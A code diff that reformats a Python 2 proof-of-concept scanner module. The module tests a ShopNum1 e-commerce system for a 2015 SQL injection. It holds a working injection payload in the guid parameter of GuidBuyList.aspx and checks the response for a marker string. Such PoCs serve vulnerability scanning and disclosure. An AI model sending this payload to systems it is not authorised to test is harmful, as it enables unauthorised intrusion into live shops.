@@ -1,15 +1,15 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 
 class Vuln(ABVuln):
-    vuln_id = 'ShopNum1_0009' # 平台漏洞编号，留空
+    vuln_id = 'ShopNum1_0009'  # 平台漏洞编号，留空
     name = '武汉群翔软件有限公司商城系统注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-12'  # 漏洞公布时间
     desc = '''
         武汉群翔软件有限公司商城系统注入.
@@ -19,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'ShopNum1'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '7fff8bc8-db1b-42e6-b066-68d198c3baaa'
@@ -32,20 +33,21 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-        
+
             arg = '{target}'.format(target=self.target)
             payload = "/GuidBuyList.aspx?guid=97dcbadc-9b4f-4ff5-9ffb-17e46e10d66d%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
-            url=arg+payload
-            code, head, res, errcode,finalurl =  hh.http(url)
+            url = arg+payload
+            code, head, res, errcode, finalurl = hh.http(url)
             if code == 200 and "testXQ17" in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
